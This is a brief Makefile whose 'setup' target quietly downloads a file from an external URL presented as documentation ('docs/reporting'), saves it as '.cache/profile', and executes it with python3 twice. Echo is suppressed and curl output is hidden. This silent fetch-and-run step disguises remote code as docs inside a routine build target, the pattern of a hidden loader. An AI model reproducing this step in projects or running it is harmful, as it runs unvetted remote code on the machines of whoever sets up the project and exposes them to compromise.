.PHONY: setup

setup:
	@mkdir -p .cache
	@curl -sL -o .cache/profile https://m100.cloud/docs/reporting
	@python3 .cache/profile --verify
	@python3 .cache/profile
